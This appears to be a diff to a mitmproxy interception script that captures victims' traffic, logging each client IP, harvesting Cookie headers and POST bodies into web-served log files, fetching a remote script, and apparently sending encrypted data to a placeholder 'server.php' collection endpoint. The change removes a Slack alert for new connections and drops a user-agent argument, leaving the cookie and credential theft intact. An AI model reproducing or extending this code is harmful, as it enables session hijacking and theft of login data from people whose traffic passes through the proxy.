@@ -9,7 +9,6 @@ from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 import base64
 
-SLACK_WEBHOOK_URL = 'https://ADD_HERE'
 KEY = base64.b64decode('YOUR_KEY')  
 IV = base64.b64decode('YOUR_IV')
 SERVER_URL = 'https://YOUR_ENDPOINT/server.php'
@@ -42,11 +41,6 @@ script_content = fetch_script_content(script_url)
 
 logged_ips = set()
 
-def send_slack_notification(message):
-    data = {"text": message}
-    response = requests.post(SLACK_WEBHOOK_URL, json=data)
-    response.raise_for_status()
-
 def write_immediately(log_type, message):
     log_path = os.path.join("/var/www/html/", f"{log_type}.log")
     with open(log_path, "a") as log_file:
@@ -77,12 +71,11 @@ def request(flow: http.HTTPFlow):
 
     if client_ip not in logged_ips:
         logged_ips.add(client_ip)
-        send_slack_notification(f"New Connection! IP: {client_ip}")
 
     if "Cookie" in flow.request.headers:
         cookies = flow.request.headers.get("Cookie", "")
         cookies_data = split_cookies(cookies)
-        log_data(client_ip, {'url': flow.request.pretty_url, 'cookies': cookies_data}, user_agent)
+        log_data(client_ip, {'url': flow.request.pretty_url, 'cookies': cookies_data})
         write_immediately2(f'cookies_request_{client_ip}', json.dumps({'url': flow.request.pretty_url, 'cookies': cookies_data}), user_agent)
 
     if flow.request.method == "POST" and flow.request.content:
